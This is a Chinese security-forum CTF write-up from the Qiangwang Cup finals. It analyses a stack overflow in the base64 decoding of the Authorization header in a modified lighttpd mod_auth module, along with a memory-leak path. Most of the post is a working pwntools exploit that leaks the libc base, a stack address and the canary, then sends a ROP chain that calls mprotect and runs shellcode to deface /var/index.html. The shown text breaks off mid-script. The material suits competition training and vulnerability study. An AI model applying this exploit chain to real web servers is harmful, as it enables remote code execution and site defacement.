---
title: lighttpd溢出漏洞构造ROP链
url: https://forum.butian.net/share/3991
source: 奇安信攻防社区
date: 2025-01-03
fetch_date: 2025-10-06T20:04:33.399641
---

# lighttpd溢出漏洞构造ROP链

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### lighttpd溢出漏洞构造ROP链

* [漏洞分析](https://forum.butian.net/topic/48)

前几天打了下强网杯决赛，想着分享一下思路

环境配置
----
![Pasted image 20241210154543.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-0e9fc6788d7f52a011d376dd295e2f42af067c64.png)
开始启动服务和分析程序
-----------
lighttpd是一个开源项目：[Home - Lighttpd - fly light](https://www.lighttpd.net/) 发现VM并未期待服务：
```php
root@qwb-virtual-machine:/home/qwb# ss -tuln
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:\*
udp UNCONN 0 0 0.0.0.0:45712 0.0.0.0:\*
udp UNCONN 0 0 0.0.0.0:5353 0.0.0.0:\*
udp UNCONN 0 0 [::]:47852 [::]:\*
udp UNCONN 0 0 [::]:5353 [::]:\*
tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:\*
tcp LISTEN 0 128 127.0.0.1:631 0.0.0.0:\*
tcp LISTEN 0 128 [::1]:631 [::]:\*
```
手动启动服务就可以了！
```php
root@qwb-virtual-machine:/home/qwb# /home/qwb/lighttpd -f /home/qwb/lighttpd.conf
root@qwb-virtual-machine:/home/qwb# /home/qwb/lighttpd -f /home/qwb/lighttpd.conf
2024-12-10 15:21:19: (/home/x/Exp/ubuntu22/rwrw/lighttpd1.4/src/network.c.638) bind() 0.0.0.0:8080: Address already in use
```
服务端口在8080！
开始分析目标服务
--------
由于本项目是开元项目可以很快确定漏洞所在位置，难点是 diff 和 稳定利用 锁定漏洞文件:mod\\_auth.so 漏洞点在 sub\\_4989 函数中
```php
if ( !a4 || !\*(\_QWORD \*)(a4 + 8) )
return sub\_48DC(a1, a4);
v16 = (\_QWORD \*)http\_header\_request\_get(a1, 10LL, "Authorization", 13LL);
if ( !v16 )
return error\_401(a1, \*(\_\_int64 \*\*)(a3 + 8));
if ( !(unsigned int)buffer\_eq\_icase\_ssn(\*v16, "Basic ", 6LL) )
return error\_401(a1, \*(\_\_int64 \*\*)(a3 + 8));
n = (unsigned int)buffer\_clen((\_\_int64)v16) - 6LL;
if ( n > 0x8FC )
return error\_401(a1, \*(\_\_int64 \*\*)(a3 + 8));
na = li\_base64\_dec(s, 1024LL, \*v16 + 6LL, n, 0LL); // 栈溢出
```
base64 解析 Authorization 标头的账号密码时候会触发栈溢出
### li\\_base64\\_dec的溢出漏洞
详细解析：
```php
\_\_int64 \_\_fastcall li\_base64\_dec(\_\_int64 a1, \_\_int64 a2, char \*a3, \_\_int64 a4, int a5)
{
// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
v12 = a3; // 初始化输入字符串指针
v17 = &a3[a4]; // 计算输入字符串结束位置
if ( a5 )
v5 = &unk\_65A60; // 如果 a5 为真，则使用特定解码表
else
v5 = &unk\_65980; // 否则使用默认解码表
v18 = v5;
v13 = 0LL;
v14 = 0LL;
v15 = 0;
v16 = 0LL;
// 潜在漏洞点：缺少对 a3 和 a4 的有效性检查
// 如果 a3 为 NULL 或 a4 为负数，可能会导致未定义行为或越界访问
// 建议：在进入循环之前，应该验证 a3 是否为空以及 a4 是否为正数
while ( v12 < v17 )
{
if ( \*v12 < 0 ) // 检查字符是否有效
v6 = -1LL; // 非法字符，设置为 -1
else
v6 = v18[\*v12]; // 查找解码表中的值
v13 = v6;
if ( v6 >= 0 ) // 如果是合法的 Base64 字符
{
v14 = v6 | (v14 << 6); // 移位并组合新的字节
// 潜在漏洞点：没有检查 a1 + v16 是否越界
// 如果 v16 超过了 a2（输出缓冲区大小），可能会发生缓冲区溢出
// 建议：在写入 a1 之前，应该确保 v16 小于 a2
if ( (++v15 & 3) == 0 ) // 每四个字符生成三个字节
{
\*(a1 + v16) = BYTE2(v14);
\*(a1 + v16 + 1) = BYTE1(v14);
v7 = v16 + 2;
v16 += 3LL;
\*(a1 + v7) = v14;
v14 = 0LL;
}
}
else if ( v6 != -2 ) // 如果不是填充字符（'='）
{
break; // 遇到非法字符时退出循环
}
++v12; // 移动到下一个输入字符
}
// 潜在漏洞点：没有处理不完整的 Base64 编码块
// 如果输入数据不是有效的 Base64 编码（例如，长度不是 4 的倍数），可能会导致错误的结果
if ( v12 == v17 || v13 == -3 || \*v12 )
v8 = v15 & 3;
else
v8 = 1LL;
if ( v8 == 3 )
{
v9 = v16++;
\*(a1 + v9) = v14 >> 10;
v14 \*= 4LL;
goto LABEL\_26;
}
if ( v8 <= 3 )
{
if ( !v8 )
return v16;
if ( v8 != 2 )
return 0LL;
LABEL\_26:
v10 = v16++;
\*(a1 + v10) = v14 >> 4;
return v16;
}
return 0LL;
}
```
### lighttpd的泄露内存信息
同时如果 base64 解析后的账号密码如果不存在 : ，那么就会走到另外一个 patch 函数 sub\\_4720，该函数可以不截断输出错误的账号信息，因此可以用来信息泄露。
```php
v21 = (char \*)memchr(s, ':', na); //判断是否存在分号
if ( v21 ){
...
}
else
{
s[na - 1] = 0;
log\_error(
\*(\_QWORD \*)(a1 + 96),
"/home/x/Exp/ubuntu22/rwrw/lighttpd1.4/src/mod\_auth.c",
845LL,
"missing ':' in %s",
s);
return sub\_4720(a1, \*(\_QWORD \*)(a3 + 8), (const char \*)dest);// 函数被修改，可以通过控制字符串无 : 来走到这里写了内存信息
}
```
开始构造攻击链
-------
### 第一部分初始化连接
```php
with remote(target\_ip, 8080) as connection:
payload = (
b'GET /www/ HTTP/1.1\r\n'
b'Host: www.xmcve.com\r\n'
b'Authorization: Basic ' + base64.b64encode(b'a' \* 0x68) + b'\r\n\r\n'
)
send\_line(connection, payload)
connection.close()
sleep(3)
```
### 通过sub\\_4720泄露出libc\\_base
```php
# Start the attack
with remote(target\_ip, 8080) as connection:
# Send the initial payload
send\_line(connection, payload)
# Leak and calculate libc base address
for \_ in range(2):
receive\_until(connection, b'a' \* 0x68)
libc\_base = read\_64\_bits(connection) - 0xe1225
receive\_data(connection)
```
### 继续泄露栈地址
```php
# Leak stack address
payload = (
b'GET /www/ HTTP/1.1\r\n'
b'Host: www.xmcve.com\r\n'
b'Authorization: Basic ' + base64.b64encode(b'c' \* 0x80) + b'\r\n\r\n'
)
sleep(1)
send\_line(connection, payload)
receive\_until(connection, b'c' \* 0x80)
leaked\_stack = read\_64\_bits(connection)
receive\_data(connection)
```
### 泄露Canary
```php
# Leak canary
payload = (
b'GET /www/ HTTP/1.1\r\n'
b'Host: www.xmcve.com\r\n'
b'Authorization: Basic ' + base64.b64encode(b'b' \* 0xe9) + b'\r\n\r\n'
)
sleep(1)
send\_line(connection, payload)
receive\_until(connection, b'b' \* 0xe9)
canary\_value = u64(connection.recv(7).rjust(8, b'\x00'))
receive\_data(connection)
```
### 构造ROP链调用shellcode
```php
# Prepare the shellcode and ROP chain
system\_addr, bin\_sh\_addr = find\_system\_and\_binsh(libc\_base, remote\_library)
ret\_addr = libc\_base + 0x0000000000029139
rdi\_gadget = libc\_base + 0x000000000002a3e5
rsi\_gadget = libc\_base + 0x000000000002be51
rdx\_r12\_gadget = libc\_base + 0x000000000011f2e7
rax\_gadget = libc\_base + 0x0000000000045eb0
syscall\_gadget = libc\_base + 0x0000000000029db4
read\_function = libc\_base + remote\_library.sym['read']
mprotect\_function = libc\_base + remote\_library.sym['mprotect']
html\_content = (
b'\n'
b'<html>\n<head>\n <title>test!</title>\n</head>\n<body>\n'
b' <h1>Test!!!!!!</h1>\n <p>Hacked by Test.</p>\n</body>\n</html>\x00'
)
shellcode = asm(
shellcraft.open('/var/index.html', 'O\_RDWR') +
'mov r15, rax' +
shellcraft.write('rax', leaked\_stack + 0x1d0, 0x100) +
shellcraft.close('r15')
).ljust(0x100, b'\x00') + html\_content
rop\_chain = (
b'a' \* 0x408 + pack('<Q', canary\_value) + pack('<Q', 0) +
pack('<Q', rdi\_gadget) + pack('<Q', leaked\_stack >> 12 << 12) +
pack('<Q', rsi\_gadget) + pack('<Q', 0x2000) +
pack('<Q', rdx\_r12\_gadget) + pack('<Q', 0x7) \* 2 +
pack('<Q', mprotect\_function) +
pack('<Q', leaked\_stack + 0xd0) +
shellcode
)
```
### 开始EXP进行攻击
exp
```php
import base64
from pwn import \*
from struct import pack, unpack
from time import sleep
# Debug function to attach GDB if needed
def attach\_debugger(process, command=None):
if command:
gdb.attach(process, command)
else:
gdb.attach(process)
pause()
# Helper function to calculate the addresses of system and /bin/sh in libc
def find\_system\_and\_binsh(libc\_base\_address, libc):
return (libc\_base\_address + libc.sym['system'],
libc\_base\_address + next(libc.search(b'/bin/sh\x00')))
#-----------------------------------------------------------------------------------------
# Wrapper functions for pwntools operations with more descriptive names
def send\_data(process, data):
process.send(data)
def send\_after(process, text, data):
process.sendafter(text, data)
def send\_line(process, data):
process.sendline(data)
def send\_line\_after(process, text, data):
process.sendlineafter(text, data)
def receive\_data(process, num\_bytes=4096):
return process.recv(num\_bytes)
def receive\_until(process, text):
return process.recvuntil(text)
def print\_received\_data(process, num\_bytes=4096):
prin...